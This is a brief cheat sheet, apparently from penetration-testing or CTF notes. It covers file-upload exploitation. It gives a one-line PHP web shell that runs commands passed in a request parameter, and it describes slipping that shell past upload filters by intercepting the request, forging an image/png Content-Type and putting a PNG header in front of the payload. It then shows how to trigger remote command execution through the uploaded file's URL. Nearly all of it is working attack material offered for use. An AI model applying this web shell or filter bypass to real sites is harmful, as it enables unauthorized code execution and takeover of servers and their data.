# File Upload Exploits

### Uploading using php
```
# Create a php script, file.php with this command
# RCE can be obtained using targetsite.com/file.php?cmd=whoami
<?php echo system($_REQUEST['cmd']); ?>

# Check what types of file you can upload
# If you can upload .png and not .php, upload and intercept both attempts
# Add the following from your .png upload to the .php intercept and upload
Content-Type: image/png
PNG header
andsubsequentcodestuffinfrontofyour<?php echo system($_REQUEST['cmd']); ?>

# Now you can access through
targetsite.com/whereveritwasuploadedto/file.php?cmd=whoami
```
